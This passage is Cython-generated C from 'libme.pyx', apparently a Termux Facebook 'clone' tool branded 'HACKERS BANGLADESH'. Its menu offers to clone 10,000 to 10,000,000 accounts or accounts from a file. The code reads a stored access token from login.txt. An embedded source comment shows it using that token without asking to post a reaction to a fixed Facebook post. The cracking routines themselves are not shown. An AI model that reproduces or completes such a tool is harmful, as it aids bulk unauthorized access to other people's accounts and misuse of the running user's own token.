 * 			self.__33__3__()
 * 		elif james == "0" or james == "00":
 */
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 384, __pyx_L1_error)
  if (!__pyx_t_12) {
  } else {
    __pyx_t_11 = __pyx_t_12;
    goto __pyx_L26_bool_binop_done;
  }
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 384, __pyx_L1_error)
  __pyx_t_11 = __pyx_t_12;
  __pyx_L26_bool_binop_done:;
  if (__pyx_t_11) {

    /* "libme.pyx":385
 * 			self.__method__1__()
 * 		elif james == "3" or james == "03":
 * 			self.__33__3__()             # <<<<<<<<<<<<<<
 * 		elif james == "0" or james == "00":
 * 			os.system("rm -f login.txt")
 */
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_33__3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 385, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_10 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 385, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    /* "libme.pyx":384
 * 		elif james == "2" or james == "02":
 * 			self.__method__1__()
 * 		elif james == "3" or james == "03":             # <<<<<<<<<<<<<<
 * 			self.__33__3__()
 * 		elif james == "0" or james == "00":
 */
    goto __pyx_L21;
  }

  /* "libme.pyx":386
 * 		elif james == "3" or james == "03":
 * 			self.__33__3__()
 * 		elif james == "0" or james == "00":             # <<<<<<<<<<<<<<
 * 			os.system("rm -f login.txt")
 * 			exit("\n [] Successfully deleted token")
 */
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_0, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 386, __pyx_L1_error)
  if (!__pyx_t_12) {
  } else {
    __pyx_t_11 = __pyx_t_12;
    goto __pyx_L28_bool_binop_done;
  }
  __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_v_james, __pyx_kp_s_00, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 386, __pyx_L1_error)
  __pyx_t_11 = __pyx_t_12;
  __pyx_L28_bool_binop_done:;
  if (__pyx_t_11) {

    /* "libme.pyx":387
 * 			self.__33__3__()
 * 		elif james == "0" or james == "00":
 * 			os.system("rm -f login.txt")             # <<<<<<<<<<<<<<
 * 			exit("\n [] Successfully deleted token")
 * 		else:
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 387, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 387, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_10 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_kp_s_rm_f_login_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_rm_f_login_txt);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 387, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    /* "libme.pyx":388
 * 		elif james == "0" or james == "00":
 * 			os.system("rm -f login.txt")
 * 			exit("\n [] Successfully deleted token")             # <<<<<<<<<<<<<<
 * 		else:
 * 			self.__login__()
 */
    __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__32, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 388, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

    /* "libme.pyx":386
 * 		elif james == "3" or james == "03":
 * 			self.__33__3__()
 * 		elif james == "0" or james == "00":             # <<<<<<<<<<<<<<
 * 			os.system("rm -f login.txt")
 * 			exit("\n [] Successfully deleted token")
 */
    goto __pyx_L21;
  }

  /* "libme.pyx":390
 * 			exit("\n [] Successfully deleted token")
 * 		else:
 * 			self.__login__()             # <<<<<<<<<<<<<<
 * 
 * 	def __method__2__(self):
 */
  /*else*/ {
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 390, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_10 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 390, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  }
  __pyx_L21:;

  /* "libme.pyx":357
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 * 		self.__menu__file__()
 * 	def __menu__file__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("libme.James.__menu__file__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XDECREF(__pyx_v_james);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":392
 * 			self.__login__()
 * 
 * 	def __method__2__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")
 * 		print("  [2] Clone All in one Account")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_25__method__2__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_25__method__2__ = {"__method__2__", (PyCFunction)__pyx_pw_5libme_5James_25__method__2__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_25__method__2__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__method__2__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_24__method__2__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_24__method__2__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v___method__2__ = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__method__2__", 0);

  /* "libme.pyx":393
 * 
 * 	def __method__2__(self):
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")             # <<<<<<<<<<<<<<
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_1_Clone_only_10000_to_100) < 0) __PYX_ERR(0, 393, __pyx_L1_error)

  /* "libme.pyx":394
 * 	def __method__2__(self):
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")
 * 		print("  [2] Clone All in one Account")             # <<<<<<<<<<<<<<
 * 		print("  [3] Clone using file path")
 * 		__method__2__ = input("\n  [] Choose Option : ")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_2_Clone_All_in_one_Account) < 0) __PYX_ERR(0, 394, __pyx_L1_error)

  /* "libme.pyx":395
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")             # <<<<<<<<<<<<<<
 * 		__method__2__ = input("\n  [] Choose Option : ")
 * 		if __method__2__ == "":
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_3_Clone_using_file_path) < 0) __PYX_ERR(0, 395, __pyx_L1_error)

  /* "libme.pyx":396
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")
 * 		__method__2__ = input("\n  [] Choose Option : ")             # <<<<<<<<<<<<<<
 * 		if __method__2__ == "":
 * 			self.menu_file()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__33, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v___method__2__ = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":397
 * 		print("  [3] Clone using file path")
 * 		__method__2__ = input("\n  [] Choose Option : ")
 * 		if __method__2__ == "":             # <<<<<<<<<<<<<<
 * 			self.menu_file()
 * 		elif __method__2__ == "1":
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__2__, __pyx_kp_s_, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 397, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":398
 * 		__method__2__ = input("\n  [] Choose Option : ")
 * 		if __method__2__ == "":
 * 			self.menu_file()             # <<<<<<<<<<<<<<
 * 		elif __method__2__ == "1":
 * 			self.__masal__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menu_file); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 398, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 398, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":397
 * 		print("  [3] Clone using file path")
 * 		__method__2__ = input("\n  [] Choose Option : ")
 * 		if __method__2__ == "":             # <<<<<<<<<<<<<<
 * 			self.menu_file()
 * 		elif __method__2__ == "1":
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":399
 * 		if __method__2__ == "":
 * 			self.menu_file()
 * 		elif __method__2__ == "1":             # <<<<<<<<<<<<<<
 * 			self.__masal__()
 * 			self.__1000__()
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__2__, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 399, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":400
 * 			self.menu_file()
 * 		elif __method__2__ == "1":
 * 			self.__masal__()             # <<<<<<<<<<<<<<
 * 			self.__1000__()
 * 		elif __method__2__ == "2":
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_masal); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 400, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 400, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":401
 * 		elif __method__2__ == "1":
 * 			self.__masal__()
 * 			self.__1000__()             # <<<<<<<<<<<<<<
 * 		elif __method__2__ == "2":
 * 			self.__masal2__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_1000); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 401, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 401, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":399
 * 		if __method__2__ == "":
 * 			self.menu_file()
 * 		elif __method__2__ == "1":             # <<<<<<<<<<<<<<
 * 			self.__masal__()
 * 			self.__1000__()
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":402
 * 			self.__masal__()
 * 			self.__1000__()
 * 		elif __method__2__ == "2":             # <<<<<<<<<<<<<<
 * 			self.__masal2__()
 * 			self.__Frr__()
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__2__, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 402, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":403
 * 			self.__1000__()
 * 		elif __method__2__ == "2":
 * 			self.__masal2__()             # <<<<<<<<<<<<<<
 * 			self.__Frr__()
 * 		elif __method__2__ == "3":
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_masal2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 403, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 403, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":404
 * 		elif __method__2__ == "2":
 * 			self.__masal2__()
 * 			self.__Frr__()             # <<<<<<<<<<<<<<
 * 		elif __method__2__ == "3":
 * 			self.__menn__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_Frr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 404, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":402
 * 			self.__masal__()
 * 			self.__1000__()
 * 		elif __method__2__ == "2":             # <<<<<<<<<<<<<<
 * 			self.__masal2__()
 * 			self.__Frr__()
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":405
 * 			self.__masal2__()
 * 			self.__Frr__()
 * 		elif __method__2__ == "3":             # <<<<<<<<<<<<<<
 * 			self.__menn__()
 * 	def __masal__(self):
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__2__, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 405, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":406
 * 			self.__Frr__()
 * 		elif __method__2__ == "3":
 * 			self.__menn__()             # <<<<<<<<<<<<<<
 * 	def __masal__(self):
 * 		try:
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menn); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":405
 * 			self.__masal2__()
 * 			self.__Frr__()
 * 		elif __method__2__ == "3":             # <<<<<<<<<<<<<<
 * 			self.__menn__()
 * 	def __masal__(self):
 */
  }
  __pyx_L3:;

  /* "libme.pyx":392
 * 			self.__login__()
 * 
 * 	def __method__2__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")
 * 		print("  [2] Clone All in one Account")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("libme.James.__method__2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v___method__2__);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":407
 * 		elif __method__2__ == "3":
 * 			self.__menn__()
 * 	def __masal__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_27__masal__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_27__masal__ = {"__masal__", (PyCFunction)__pyx_pw_5libme_5James_27__masal__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_27__masal__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__masal__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_26__masal__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_26__masal__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v___total = NULL;
  PyObject *__pyx_v___file = NULL;
  PyObject *__pyx_v_zx = NULL;
  PyObject *__pyx_v___ids = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_ex = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v___id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  int __pyx_t_14;
  int __pyx_t_15;
  int __pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__masal__", 0);

  /* "libme.pyx":408
 * 			self.__menn__()
 * 	def __masal__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":409
 * 	def __masal__(self):
 * 		try:
 * 			token =open('login.txt', 'r').read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 409, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 409, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 409, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":408
 * 			self.__menn__()
 * 	def __masal__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "libme.pyx":410
 * 		try:
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
